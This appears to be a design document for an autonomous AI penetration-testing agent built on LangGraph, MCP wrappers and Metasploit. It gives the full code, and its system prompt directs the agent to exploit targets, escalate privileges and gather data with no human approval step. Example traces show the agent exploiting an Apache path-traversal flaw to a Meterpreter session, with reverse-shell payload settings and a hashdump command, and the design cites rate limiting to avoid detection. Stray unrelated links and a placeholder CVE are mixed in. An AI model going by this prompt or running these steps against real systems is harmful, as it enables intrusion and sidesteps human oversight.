RLM with REPL
https://github.com/alexzhang13/rlm
https://github.com/alexzhang13/rlm-minimal
https://alexzhang13.github.io/blog/2025/rlm/?utm_source=www.theunwindai.com&utm_medium=referral&utm_campaign=claude-code-s-hidden-multi-agent-orchestration-now-open-source


# RedAmon Agentic AI - Autonomous Penetration Testing

## Overview

An agentic AI system that autonomously performs penetration testing by leveraging:
- **Neo4j Graph Database**: Text-to-Cypher queries to understand target infrastructure from recon data
- **MCP Servers**: Tool integration for naabu, curl, nuclei, and metasploit
- **Kali Linux Sandbox**: Isolated Docker environment with all security tools
- **LangGraph Agent**: ReAct-style reasoning with Thought → Tool Call → Response chains

---

## Architecture

```
┌──────────────────────────────────────────────────────────────────────────────────────┐
│                            RedAmon Agentic Architecture                               │
├──────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                      │
│   USER PROMPT: "Find vulnerabilities on 10.0.0.5 and exploit them"                   │
│                                         │                                            │
│                                         ▼                                            │
│  ┌────────────────────────────────────────────────────────────────────────────────┐  │
│  │                          LANGGRAPH AGENT (ReAct)                               │  │
│  │                                                                                │  │
│  │   ┌──────────┐    ┌───────────┐    ┌──────────┐    ┌──────────┐               │  │
│  │   │ Thought  │───►│ Tool Call │───►│ Response │───►│ Thought  │───► ...       │  │
│  │   └──────────┘    └─────┬─────┘    └────▲─────┘    └──────────┘               │  │
│  │                         │               │                                      │  │
│  │   Phases: Planning ──► Scanning ──► Enumeration ──► Exploitation ──► Report   │  │
│  └─────────────────────────┼───────────────┼─────────────────────────────────────┘  │
│                            │               │                                         │
│            ┌───────────────┴───────────────┴───────────────┐                        │
│            │              MCP PROTOCOL (JSON-RPC)          │                        │
│            └───────────────┬───────────────┬───────────────┘                        │
│                            │               │                                         │
│       ┌────────────────────┴───┐       ┌───┴────────────────────────────────────┐   │
│       ▼                        │       ▼                                         │   │
│  ┌─────────────────────┐       │  ┌─────────────────────────────────────────────┐   │
│  │  NEO4J CONTAINER    │       │  │         KALI SANDBOX CONTAINER              │   │
│  │                     │       │  │                                             │   │
│  │  Text-to-Cypher     │       │  │  ┌─────────────────────────────────────┐   │   │
│  │  ┌───────────────┐  │       │  │  │         MCP SERVERS (Python)        │   │   │
│  │  │ Graph DB      │  │       │  │  │                                     │   │   │
│  │  │               │  │       │  │  │  naabu_server ──► /usr/bin/naabu    │   │   │
│  │  │ (Host)        │  │       │  │  │  nuclei_server ─► /usr/bin/nuclei   │   │   │
│  │  │   ↓           │  │       │  │  │  curl_server ───► /usr/bin/curl     │   │   │
│  │  │ (Port)        │  │       │  │  │  msf_server ────► /usr/bin/msfconsole│  │   │
│  │  │   ↓           │  │       │  │  │                                     │   │   │
│  │  │ (Technology)  │  │       │  │  └──────────────────┬──────────────────┘   │   │
│  │  │   ↓           │  │       │  │                     │                       │   │
│  │  │ (CVE)         │  │       │  │                     ▼                       │   │
│  │  │   ↓           │  │       │  │  ┌─────────────────────────────────────┐   │   │
│  │  │ (CWE/CAPEC)   │  │       │  │  │      INSTALLED TOOLS (binaries)     │   │   │
│  │  └───────────────┘  │       │  │  │  • naabu    - port scanning         │   │   │
│  │                     │       │  │  │  • nuclei   - vuln scanning         │   │   │
│  └─────────────────────┘       │  │  │  • curl     - HTTP requests         │   │   │
│            ▲                   │  │  │  • metasploit - exploitation        │   │   │
│            │                   │  │  └─────────────────────────────────────┘   │   │
│            │                   │  │                     │                       │   │
│  ┌─────────┴─────────┐         │  │                     ▼                       │   │
│  │ RedAmon Recon     │         │  │            ┌───────────────┐                │   │
│  │ (pre-loaded data) │         │  │            │ TARGET NETWORK│                │   │
│  └───────────────────┘         │  │            │  10.0.0.0/24  │                │   │
│                                │  │            └───────────────┘                │   │
│                                │  └─────────────────────────────────────────────┘   │
│                                │                                                     │
└────────────────────────────────┴─────────────────────────────────────────────────────┘
```

### How It Works

1. **Agent decides** to call a tool (e.g., `execute_naabu("-host 10.0.0.5 -p 1-1000 -json")`)
2. **MCP Protocol** sends JSON-RPC request to the Kali container
3. **MCP Server** (Python) receives request, executes `/usr/bin/naabu -host 10.0.0.5 -p 1-1000 -json`
4. **Tool output** is captured and returned to the agent via MCP
5. **Agent reasons** about the result and decides next action

The MCP servers are **thin wrappers** that translate agent tool calls into CLI commands executed inside the Kali container where all tools are installed. For maximum flexibility, naabu/nuclei/curl use dynamic command execution, while Metasploit uses structured tools due to its stateful nature.

---

## Components

### 1. Kali Linux Sandbox (Docker)

Isolated environment with all penetration testing tools pre-installed.

**Dockerfile:**
```dockerfile
FROM kalilinux/kali-rolling:latest

RUN apt-get update && apt-get install -y \
    nmap \
    naabu \
    nuclei \
    curl \
    metasploit-framework \
    python3 \
    python3-pip \
    && rm -rf /var/lib/apt/lists/*

# Install MCP server dependencies
RUN pip3 install mcp fastmcp

# Copy MCP servers
COPY mcp_servers/ /opt/mcp_servers/

WORKDIR /opt/mcp_servers

EXPOSE 8000-8003

CMD ["python3", "run_all_servers.py"]
```

**docker-compose.yml:**
```yaml
version: '3.8'

services:
  kali-sandbox:
    build: ./kali-sandbox
    container_name: redamon-kali
    networks:
      - pentest-net
    cap_add:
      - NET_ADMIN
      - NET_RAW
    ports:
      - "8000:8000"  # naabu MCP
      - "8001:8001"  # curl MCP
      - "8002:8002"  # nuclei MCP
      - "8003:8003"  # metasploit MCP
    volumes:
      - ./mcp_servers:/opt/mcp_servers
      - ./output:/opt/output

  neo4j:
    image: neo4j:5-community
    container_name: redamon-neo4j
    environment:
      - NEO4J_AUTH=neo4j/redamon123
    ports:
      - "7474:7474"
      - "7687:7687"
    volumes:
      - neo4j_data:/data

  agent:
    build: ./agent
    container_name: redamon-agent
    depends_on:
      - kali-sandbox
      - neo4j
    environment:
      - ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY}
      - NEO4J_URI=bolt://neo4j:7687
      - NEO4J_USER=neo4j
      - NEO4J_PASSWORD=redamon123
    networks:
      - pentest-net

networks:
  pentest-net:
    driver: bridge

volumes:
  neo4j_data:
```

---

### 2. MCP Servers

MCP servers expose penetration testing tools to the AI agent. We use two approaches:

**Dynamic CLI Wrappers**: All tools (naabu, nuclei, curl, metasploit) use generic `execute`/`console` tools that accept raw CLI arguments. This maximizes flexibility since LLMs know these tools from training data.

For stateful tools like Metasploit, we use a **persistent process** via pexpect to maintain sessions, handlers, and state between calls.

#### Tool Design Philosophy

| Server | Approach | Rationale |
|--------|----------|-----------|
| naabu | Dynamic (`execute` + `help`) | Simple CLI, LLM knows flags |
| nuclei | Dynamic (`execute` + `help`) | Many templates/options, flexible |
| curl | Dynamic (`execute` + `help`) | Countless flags, LLM expertise |
| metasploit | Dynamic (`console`) with persistent process | Stateful via pexpect, LLM knows msfconsole |

**Key insight**: LLMs are trained on extensive Metasploit documentation, CTF writeups, and tutorials. Rather than constraining them with structured tools, we give them a persistent msfconsole session and let them use their knowledge directly.

---

**mcp_servers/naabu_server.py:**
```python
from fastmcp import FastMCP
import subprocess
import shlex

mcp = FastMCP("naabu")

@mcp.tool()
def execute_naabu(args: str) -> str:
    """
    Execute naabu port scanner with any valid CLI arguments.

    Args:
        args: Command-line arguments for naabu (without the 'naabu' command itself)

    Returns:
        Command output (stdout + stderr combined)

    Examples:
        - "-host 10.0.0.5 -p 1-1000 -rate 1000 -json"
        - "-host 192.168.1.0/24 -top-ports 100 -json"
        - "-list targets.txt -p 22,80,443,8080 -json"
        - "-host 10.0.0.5 -p 80,443 -nmap-cli 'nmap -sV'"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["naabu"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=300
        )
        output = result.stdout
        if result.stderr:
            output += f"\n[STDERR]: {result.stderr}"
        return output
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 300 seconds"
    except Exception as e:
        return f"[ERROR] {str(e)}"

@mcp.tool()
def naabu_help() -> str:
    """
    Get naabu help and usage information.
    Use this to discover available flags and options.

    Returns:
        Naabu help output with all available options
    """
    result = subprocess.run(
        ["naabu", "-help"],
        capture_output=True,
        text=True
    )
    return result.stdout + result.stderr

if __name__ == "__main__":
    mcp.run(transport="stdio")
```

---

**mcp_servers/nuclei_server.py:**
```python
from fastmcp import FastMCP
import subprocess
import shlex

mcp = FastMCP("nuclei")

@mcp.tool()
def execute_nuclei(args: str) -> str:
    """
    Execute nuclei vulnerability scanner with any valid CLI arguments.

    Args:
        args: Command-line arguments for nuclei (without the 'nuclei' command itself)

    Returns:
        Command output (stdout + stderr combined)

    Examples:
        - "-u http://10.0.0.5 -severity critical,high -jsonl"
        - "-u http://10.0.0.5 -id CVE-2021-41773 -jsonl"
        - "-u http://10.0.0.5 -tags cve,rce -jsonl"
        - "-l urls.txt -severity critical -jsonl"
        - "-u http://10.0.0.5 -t /path/to/template.yaml"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["nuclei"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=600
        )
        output = result.stdout
        if result.stderr:
            output += f"\n[STDERR]: {result.stderr}"
        return output
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 600 seconds"
    except Exception as e:
        return f"[ERROR] {str(e)}"

@mcp.tool()
def nuclei_help() -> str:
    """
    Get nuclei help and usage information.
    Use this to discover available flags, template options, and severity levels.

    Returns:
        Nuclei help output with all available options
    """
    result = subprocess.run(
        ["nuclei", "-help"],
        capture_output=True,
        text=True
    )
    return result.stdout + result.stderr

if __name__ == "__main__":
    mcp.run(transport="stdio")
```

---

**mcp_servers/curl_server.py:**
```python
from fastmcp import FastMCP
import subprocess
import shlex

mcp = FastMCP("curl")

@mcp.tool()
def execute_curl(args: str) -> str:
    """
    Execute curl HTTP client with any valid CLI arguments.

    Args:
        args: Command-line arguments for curl (without the 'curl' command itself)

    Returns:
        Command output (stdout + stderr combined)

    Examples:
        - "-s -i http://10.0.0.5/"
        - "-s -X POST -H 'Content-Type: application/json' -d '{\"user\":\"admin\"}' http://10.0.0.5/api/login"
        - "-s -I http://10.0.0.5/ -H 'User-Agent: Mozilla/5.0'"
        - "-s -k https://10.0.0.5/ --connect-timeout 10"
        - "-s -o /dev/null -w '%{http_code}' http://10.0.0.5/"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["curl"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=60
        )
        output = result.stdout
        if result.stderr:
            output += f"\n[STDERR]: {result.stderr}"
        return output
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 60 seconds"
    except Exception as e:
        return f"[ERROR] {str(e)}"

@mcp.tool()
def curl_help() -> str:
    """
    Get curl help and usage information.
    Use this to discover available flags and options.

    Returns:
        Curl help output with common options
    """
    result = subprocess.run(
        ["curl", "--help", "all"],
        capture_output=True,
        text=True
    )
    return result.stdout + result.stderr

if __name__ == "__main__":
    mcp.run(transport="stdio")
```

---

**mcp_servers/metasploit_server.py:**

Metasploit uses a **persistent console** via pexpect. This maintains state (sessions, handlers, jobs) between tool calls while giving the LLM full flexibility to use any msfconsole command.

```python
from fastmcp import FastMCP
import pexpect
import threading

mcp = FastMCP("metasploit")

class MetasploitConsole:
    """Persistent msfconsole session with thread-safe access."""

    def __init__(self):
        self.process = None
        self.lock = threading.Lock()
        self._start_console()

    def _start_console(self):
        """Start or restart the msfconsole process."""
        if self.process:
            self.process.close()
        self.process = pexpect.spawn('msfconsole -q', timeout=300, encoding='utf-8')
        # Wait for initial prompt
        self._read_until_idle()

    def _read_until_idle(self, idle_timeout: float = 1.0, max_timeout: float = 120) -> str:
        """
        Read output until no new data arrives for idle_timeout seconds.

        This is the universal approach - works with ANY prompt, ANY shell,
        ANY context. We don't need to know what the prompt looks like,
        we just wait until the output stops flowing.

        Args:
            idle_timeout: Seconds of silence before considering command complete
            max_timeout: Maximum total time to wait

        Returns:
            All captured output
        """
        import time

        output_chunks = []
        start_time = time.time()

        while True:
            # Check total timeout
            if time.time() - start_time > max_timeout:
                break

            try:
                # Try to read with short timeout
                chunk = self.process.read_nonblocking(size=4096, timeout=idle_timeout)
                if chunk:
                    output_chunks.append(chunk)
                    # Reset idle timer when we get data
                    continue
            except pexpect.TIMEOUT:
                # No data for idle_timeout seconds = command is done
                break
            except pexpect.EOF:
                raise

        return ''.join(output_chunks)

    def execute(self, command: str, timeout: int = 120) -> str:
        """
        Execute a command and capture output using the silence-detection approach.

        This works universally across ALL contexts:
        - msfconsole prompts (msf6 >, msf6 exploit(...) >)
        - meterpreter sessions
        - Unix shells ($, #, user@host:~$)
        - Windows shells (C:\>, PS C:\>)
        - Database shells (mysql>, postgres=#)
        - Any other interactive prompt

        The approach: send command, then read until output stops flowing.
        When no new data arrives for 1 second, the command is complete.
        """
        with self.lock:
            try:
                # Clear any pending output first
                try:
                    self.process.read_nonblocking(size=65536, timeout=0.1)
                except pexpect.TIMEOUT:
                    pass

                # Send the command
                self.process.sendline(command)

                # Small delay to let command start
                import time
                time.sleep(0.05)

                # Read until output stops (idle detection)
                output = self._read_until_idle(idle_timeout=1.0, max_timeout=timeout)

                # Clean up: remove the echoed command from the start if present
                lines = output.strip().split('\n')
                if lines and command in lines[0]:
                    lines = lines[1:]

                return '\n'.join(lines).strip()

            except pexpect.TIMEOUT:
                partial = self.process.before.strip() if self.process.before else ""
                return f"{partial}\n[TIMEOUT] Command did not complete within {timeout}s"
            except pexpect.EOF:
                self._start_console()
                return "[ERROR] Console crashed, restarted. Please retry."

# Global persistent console instance
console = MetasploitConsole()

@mcp.tool()
def metasploit_console(command: str, timeout: int = 120) -> str:
    """
    Execute any command in the persistent Metasploit console.

    The console maintains state - sessions, handlers, and jobs persist
    between calls. Use standard msfconsole commands.

    Args:
        command: Any valid msfconsole command
        timeout: Command timeout in seconds (default: 120)

    Returns:
        Command output from msfconsole

    Examples:
        - "search CVE-2021-41773"
        - "search type:exploit apache"
        - "use exploit/multi/http/apache_normalize_path_rce"
        - "info"
        - "show options"
        - "show payloads"
        - "set RHOSTS 10.0.0.5"
        - "set PAYLOAD linux/x64/meterpreter/reverse_tcp"
        - "set LHOST 10.0.0.10"
        - "set LPORT 4444"
        - "check"
        - "exploit" or "exploit -j" (background job)
        - "sessions -l"
        - "sessions -i 1"
        - "background"
        - (in meterpreter) "sysinfo", "getuid", "hashdump", "shell"
    """
    return console.execute(command, timeout)

if __name__ == "__main__":
    mcp.run(transport="stdio")
```

---

### 3. Text-to-Cypher (Neo4j Integration)

Query recon data stored in Neo4j using natural language.

**agent/text_to_cypher.py:**
```python
from langchain_anthropic import ChatAnthropic
from langchain_neo4j import Neo4jGraph, GraphCypherQAChain

CYPHER_GENERATION_PROMPT = """
You are a Neo4j Cypher expert. Generate Cypher queries based on the user's question.

Schema:
{schema}

The graph contains recon data with these node types:
- (Host) - IP addresses and hostnames
- (Port) - Open ports with services
- (Technology) - Detected technologies with versions
- (Vulnerability) - CVEs with severity and CVSS
- (CWE) - Weakness types from MITRE
- (CAPEC) - Attack patterns

Relationships:
- (Host)-[:HAS_PORT]->(Port)
- (Host)-[:RUNS]->(Technology)
- (Technology)-[:HAS_CVE]->(Vulnerability)
- (Vulnerability)-[:HAS_CWE]->(CWE)
- (CWE)-[:ATTACKED_BY]->(CAPEC)

Question: {question}

Return only the Cypher query, no explanation.
"""

class TextToCypher:
    def __init__(self, neo4j_uri: str, neo4j_user: str, neo4j_password: str):
        self.graph = Neo4jGraph(
            url=neo4j_uri,
            username=neo4j_user,
            password=neo4j_password
        )
        self.llm = ChatAnthropic(model="claude-sonnet-4-20250514")
        self.chain = GraphCypherQAChain.from_llm(
            llm=self.llm,
            graph=self.graph,
            verbose=True,
            cypher_prompt=CYPHER_GENERATION_PROMPT
        )

    def query(self, question: str) -> str:
        """Convert natural language to Cypher and execute."""
        return self.chain.invoke({"query": question})

    def get_exploitable_targets(self) -> list:
        """Find hosts with critical vulnerabilities that have known exploits."""
        cypher = """
        MATCH (h:Host)-[:HAS_PORT]->(p:Port)-[:RUNS]->(t:Technology)-[:HAS_CVE]->(v:Vulnerability)
        WHERE v.severity = 'CRITICAL' AND v.has_exploit = true
        RETURN h.ip as target, p.number as port, t.name as technology,
               v.id as cve, v.cvss as cvss
        ORDER BY v.cvss DESC
        """
        return self.graph.query(cypher)
```

---

### 4. LangGraph Agent (ReAct Pattern)

The core agent using LangGraph for Thought → Tool Call → Response chains.

**agent/pentest_agent.py:**
```python
from typing import Annotated, TypedDict
from langgraph.graph import StateGraph, END
from langgraph.prebuilt import ToolNode
from langchain_anthropic import ChatAnthropic
from langchain_core.messages import HumanMessage, AIMessage, ToolMessage
from langchain_mcp import MCPToolkit

from text_to_cypher import TextToCypher

class AgentState(TypedDict):
    messages: list
    current_phase: str  # planning, scanning, enumeration, exploitation, reporting
    target: str
    findings: dict

class PentestAgent:
    def __init__(self, mcp_servers: list, neo4j_config: dict):
        self.llm = ChatAnthropic(model="claude-sonnet-4-20250514")
        self.text_to_cypher = TextToCypher(**neo4j_config)

        # Load MCP tools
        self.toolkit = MCPToolkit(servers=mcp_servers)
        self.tools = self.toolkit.get_tools() + [self._create_cypher_tool()]

        self.llm_with_tools = self.llm.bind_tools(self.tools)
        self.graph = self._build_graph()

    def _create_cypher_tool(self):
        from langchain_core.tools import tool

        @tool
        def query_recon_data(question: str) -> str:
            """
            Query the Neo4j graph database containing recon data.
            Use natural language to ask about hosts, ports, technologies,
            vulnerabilities, and their relationships.

            Examples:
            - "What hosts have critical vulnerabilities?"
            - "Show all open ports on 10.0.0.5"
            - "Which technologies have known exploits?"
            """
            return self.text_to_cypher.query(question)

        return query_recon_data

    def _build_graph(self) -> StateGraph:
        workflow = StateGraph(AgentState)

        # Nodes
        workflow.add_node("agent", self._agent_node)
        workflow.add_node("tools", ToolNode(self.tools))

        # Edges
        workflow.set_entry_point("agent")
        workflow.add_conditional_edges(
            "agent",
            self._should_continue,
            {
                "tools": "tools",
                "end": END
            }
        )
        workflow.add_edge("tools", "agent")

        return workflow.compile()

    def _agent_node(self, state: AgentState) -> AgentState:
        """Main reasoning node - generates thoughts and tool calls."""

        system_prompt = """You are an autonomous penetration testing agent.

Your goal is to find and exploit vulnerabilities on the target system.

You have access to these tools:

**Knowledge Base (ALWAYS CHECK FIRST):**
- query_recon_data(question): Query Neo4j graph for existing recon data
  - Hosts, ports, services, technologies, versions
  - Vulnerabilities (CVEs) with severity and CVSS scores
  - CWE weaknesses and CAPEC attack patterns
  - Timestamps of when data was collected

**Reconnaissance & Scanning (USE ONLY IF NEEDED):**
- execute_naabu(args): Port scanning - only if ports unknown or stale
- execute_nuclei(args): Vulnerability scanning - only if CVEs unknown or need verification
- execute_curl(args): HTTP requests - for manual verification or exploitation
- *_help(): Get usage information for each tool

**Exploitation (Persistent Console):**
- metasploit_console(command): Execute ANY msfconsole command. State persists between calls.
  Use "help" command for reference (e.g., metasploit_console("help"))

IMPORTANT WORKFLOW - Graph-First Approach:
==========================================
1. ALWAYS query the graph database FIRST to check what we already know
2. ONLY run new scans (naabu, nuclei) if:
   - No data exists for the target
   - Data is stale (older than threshold, e.g., 24 hours)
   - User explicitly requests fresh scan
   - Need to verify a specific finding before exploitation

Example queries to check existing data:
- "What hosts, ports, and vulnerabilities do we know about 10.0.0.5?"
- "Show all critical CVEs for target 10.0.0.5 with their CVSS scores"
- "When was the last scan performed on 10.0.0.5?"
- "What technologies are running on 10.0.0.5 port 80?"

Follow this methodology:
1. PLANNING: Query graph for existing recon data on the target
2. ASSESS: Determine if existing data is sufficient or if new scans needed
3. SCAN (if needed): Only scan for missing information
4. EXPLOITATION: Use metasploit_console to exploit discovered vulnerabilities
5. POST-EXPLOITATION: Interact with sessions, escalate privileges, gather data

The metasploit_console maintains a persistent session. Use it interactively:
  metasploit_console("search CVE-2021-41773")
  metasploit_console("use exploit/multi/http/apache_normalize_path_rce")
  metasploit_console("set RHOSTS 10.0.0.5")
  metasploit_console("exploit")
  metasploit_console("sessions -i 1")
  metasploit_console("sysinfo")

Always think step-by-step. Explain your reasoning before each action.
Avoid redundant scanning - leverage existing reconnaissance data.
"""

        messages = [{"role": "system", "content": system_prompt}] + state["messages"]
        response = self.llm_with_tools.invoke(messages)

        return {"messages": state["messages"] + [response]}

    def _should_continue(self, state: AgentState) -> str:
        """Determine if agent should continue or finish."""
        last_message = state["messages"][-1]
        if hasattr(last_message, "tool_calls") and last_message.tool_calls:
            return "tools"
        return "end"

    def run(self, objective: str, target: str) -> dict:
        """Execute the penetration test."""
        initial_state = {
            "messages": [HumanMessage(content=f"""
Target: {target}
Objective: {objective}

Begin the penetration test. First, query the recon database to understand
what we already know about this target.
""")],
            "current_phase": "planning",
            "target": target,
            "findings": {}
        }

        final_state = self.graph.invoke(initial_state)
        return final_state
```

---

## Usage

### 1. Start the Environment

```bash
# Start all containers
docker-compose up -d

# Wait for services to be ready
docker-compose logs -f
```

### 2. Load Recon Data into Neo4j

```bash
# Run existing RedAmon recon
python recon/main.py

# Load results into Neo4j
python graph_db/update_graph_from_json.py
```

### 3. Run the Agent

```python
from agent.pentest_agent import PentestAgent

agent = PentestAgent(
    mcp_servers=[
        {"name": "naabu", "url": "http://localhost:8000"},
        {"name": "nuclei", "url": "http://localhost:8002"},
        {"name": "curl", "url": "http://localhost:8001"},
        {"name": "metasploit", "url": "http://localhost:8003"},
    ],
    neo4j_config={
        "neo4j_uri": "bolt://localhost:7687",
        "neo4j_user": "neo4j",
        "neo4j_password": "redamon123"
    }
)

result = agent.run(
    objective="Find and exploit vulnerabilities to gain shell access",
    target="10.0.0.5"
)
```

---

## Example Agent Execution Traces


Some instruction:
use only meterpreter for exploit and post exploit

### Scenario A: Unknown Target (No Graph Data)

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│ USER: Find vulnerabilities on 10.0.0.99 and attempt to exploit them            │
└─────────────────────────────────────────────────────────────────────────────────┘

Step 1 - QUERY GRAPH FIRST
├── Thought: Let me check what we already know about this target
├── Tool:    query_recon_data("Show all data for host 10.0.0.99 including scan timestamps")
└── Response: No data found for host 10.0.0.99

Step 2 - SCANNING REQUIRED
├── Thought: No existing data. Must perform fresh reconnaissance.
├── Tool:    execute_naabu("-host 10.0.0.99 -p 1-10000 -json")
└── Response: {"host":"10.0.0.99","port":22} {"host":"10.0.0.99","port":80}

Step 3 - VULNERABILITY SCANNING
├── Thought: Found open ports. Scanning for vulnerabilities.
├── Tool:    execute_nuclei("-u http://10.0.0.99 -severity critical,high -jsonl")
└── Response: [CVE-2021-41773] Apache 2.4.49 Path Traversal - CRITICAL

Step 4 - EXPLOITATION
├── Tool:    metasploit_console("search CVE-2021-41773")
│            ... (continues with exploitation)
```

### Scenario B: Known Target (Graph Has Fresh Data) - OPTIMIZED

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│ USER: Find vulnerabilities on 10.0.0.5 and attempt to exploit them              │
└─────────────────────────────────────────────────────────────────────────────────┘

Step 1 - QUERY GRAPH
├── Thought: Before scanning, let me check what reconnaissance data already exists
│            for this target in the graph database.
├── Tool:    query_recon_data("Show all ports, technologies, and CVEs for 10.0.0.5
│                              with scan timestamps and CVSS scores")
└── Output:
      Host: 10.0.0.5 (scanned: 2 hours ago)
      Ports: 22/tcp (SSH), 80/tcp (HTTP), 443/tcp (HTTPS)
      Technology: Apache 2.4.49
      Vulnerabilities:
        - CVE-2021-41773 (CRITICAL, CVSS 9.8) - Path Traversal RCE
        - CVE-2021-42013 (CRITICAL, CVSS 9.8) - Path Traversal bypass

Step 2 - SEARCH EXPLOIT
├── Thought: Fresh data exists (2 hours old). Found critical RCE vulnerability
│            CVE-2021-41773 with CVSS 9.8. No need to rescan - searching for exploit.
├── Tool:    metasploit_console("search CVE-2021-41773")
└── Output:  exploit/multi/http/apache_normalize_path_rce  rank:excellent

Step 3 - SELECT EXPLOIT
├── Thought: Found matching exploit with excellent rank. Selecting it to examine
│            its requirements and options.
├── Tool:    metasploit_console("use exploit/multi/http/apache_normalize_path_rce")
└── Output:  [*] Using configured payload linux/x64/meterpreter/reverse_tcp

Step 4 - CHECK EXPLOIT INFO
├── Thought: Need to understand exploit requirements before configuration.
├── Tool:    metasploit_console("info")
└── Output:
      Name: Apache 2.4.49/2.4.50 - Path Traversal RCE
      Module: exploit/multi/http/apache_normalize_path_rce
      Platform: Linux, Unix
      Rank: Excellent
      Required options: RHOSTS (target), RPORT (default 80)

Step 5 - LIST PAYLOADS
├── Thought: Exploit requires RHOSTS and RPORT. Now I need to choose a payload.
│            Using bind_tcp since our host cannot receive reverse connections.
├── Tool:    metasploit_console("show payloads")
└── Output:
      Compatible Payloads:
        linux/x64/meterpreter/bind_tcp
        linux/x64/meterpreter/reverse_tcp
        linux/x64/shell/bind_tcp
        cmd/unix/reverse_bash
        ...

Step 6 - CHECK PAYLOAD INFO
├── Thought: Selecting bind_tcp for meterpreter. Let me check its requirements.
├── Tool:    metasploit_console("info payload/linux/x64/meterpreter/bind_tcp")
└── Output:
      Name: Linux Meterpreter, Bind TCP Stager
      Platform: Linux | Arch: x64
      Required options: LPORT (default 4444)
      Description: Target listens on port, we connect to it.

Step 7 - CONFIGURE OPTIONS
├── Thought: Based on exploit info (needs RHOSTS, RPORT) and payload info
│            (needs LPORT only, no LHOST for bind shells), configuring all options.
├── Tool:    metasploit_console("set RHOSTS 10.0.0.5; set PAYLOAD linux/x64/meterpreter/bind_tcp; set LPORT 4444; show options")
└── Output:
      RHOSTS => 10.0.0.5
      PAYLOAD => linux/x64/meterpreter/bind_tcp
      LPORT => 4444
      All required options configured.

Step 8 - VERIFY VULNERABILITY
├── Thought: All options set. Running check to verify target is vulnerable
│            before exploitation.
├── Tool:    metasploit_console("check")
└── Output:  [+] 10.0.0.5:80 - The target is vulnerable.

Step 9 - EXPLOIT
├── Thought: Target confirmed vulnerable. Executing exploit.
├── Tool:    metasploit_console("exploit")
└── Output:
      [*] Started bind TCP handler against 10.0.0.5:4444
      [*] Sending stage (3045380 bytes) to 10.0.0.5
      [*] Meterpreter session 1 opened (10.0.0.10:54321 -> 10.0.0.5:4444)

Step 10 - POST-EXPLOITATION RECON
├── Thought: Session opened! Gathering system information.
├── Tool:    metasploit_console("sysinfo")
└── Output:
      Computer: webserver
      OS: Ubuntu 20.04 (Linux 5.4.0)
      Architecture: x64
      Meterpreter: x64/linux

Step 11 - CHECK USER CONTEXT
├── Thought: System is Ubuntu 20.04. Checking current user privileges.
├── Tool:    metasploit_console("getuid")
└── Output:  Server username: www-data

Step 12 - PRIVILEGE ESCALATION RECON
├── Thought: Running as www-data (low privilege). Searching for SUID binaries
│            that could allow privilege escalation.
├── Tool:    metasploit_console("shell -c 'find / -perm -4000 2>/dev/null'")
└── Output:
      /usr/bin/sudo
      /usr/bin/pkexec
      /usr/bin/passwd
      ...

Step 13 - FINAL REPORT
├── Thought: Successfully exploited CVE-2021-41773 and obtained shell as www-data.
│            Found potential privesc vectors (sudo, pkexec).
│            EFFICIENCY: Skipped naabu + nuclei by using graph data.
├── Tool:    None (reporting complete)
└── Summary:
      Target: 10.0.0.5
      Vulnerability: CVE-2021-41773 (CVSS 9.8)
      Exploit: apache_normalize_path_rce
      Access: Meterpreter session as www-data
      Next steps: Investigate sudo/pkexec for privilege escalation
```

### Scenario C: Stale Data (Selective Rescan)

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│ USER: Check 10.0.0.5 for vulnerabilities                                       │
└─────────────────────────────────────────────────────────────────────────────────┘

Step 1 - QUERY GRAPH
├── Tool:    query_recon_data("When was 10.0.0.5 last scanned? Show CVEs and ports.")
└── Response:
    Host: 10.0.0.5 (scanned: 7 days ago)
    Ports: 22, 80, 443
    CVEs: CVE-2021-41773

Step 2 - ASSESS DATA FRESHNESS
├── Thought: Data is 7 days old. Ports unlikely to change, but new CVEs may exist.
│            I'll run nuclei for fresh vulnerability data, skip port scanning.
└── Decision: Run nuclei only, skip naabu

Step 3 - SELECTIVE VULNERABILITY SCAN
├── Tool:    execute_nuclei("-u http://10.0.0.5 -severity critical,high,medium -jsonl")
└── Response: [CVE-2021-41773] confirmed
              [CVE-2024-12345] NEW - Apache mod_proxy SSRF (CRITICAL)

Step 4 - PROCEED WITH NEW FINDING
├── Thought: Found a new critical CVE! Proceeding to exploit CVE-2024-12345.
│            ... (continues with exploitation)
```

### Decision Matrix: When to Scan

| Scenario | Naabu (Ports) | Nuclei (CVEs) | Rationale |
|----------|---------------|---------------|-----------|
| No data in graph | Yes | Yes | Must discover everything |
| Fresh data (<24h) | No | No | Trust existing data |
| Stale data (>24h) | No | Yes | Ports stable, CVEs change |
| User requests fresh scan | Yes | Yes | Explicit override |
| Pre-exploitation verify | No | Maybe | Use metasploit `check` instead |

---

## Key Dependencies

```
# requirements.txt
langchain>=0.3.0
langchain-anthropic>=0.3.0
langchain-neo4j>=0.1.0
langgraph>=0.2.0
langchain-mcp>=0.1.0
mcp>=1.0.0
fastmcp>=0.1.0
neo4j>=5.0.0
pexpect>=4.8.0          # For persistent msfconsole session
```

---

## Security Considerations

1. **Isolated Network**: The Kali sandbox runs in an isolated Docker network
2. **Authorization Required**: Only run against systems you have permission to test
3. **Audit Logging**: All agent actions are logged for review
4. **Rate Limiting**: Tool calls include rate limiting to avoid detection
5. **Kill Switch**: Agent can be terminated at any time via API

---

## Roadmap

- [ ] Add more MCP servers (gobuster, sqlmap, hydra)
- [ ] Implement multi-agent coordination (scanner agent, exploiter agent)
- [ ] Add reporting agent for automatic report generation
- [ ] Integrate with MITRE ATT&CK for tactic/technique mapping
- [ ] Add memory/context persistence across sessions
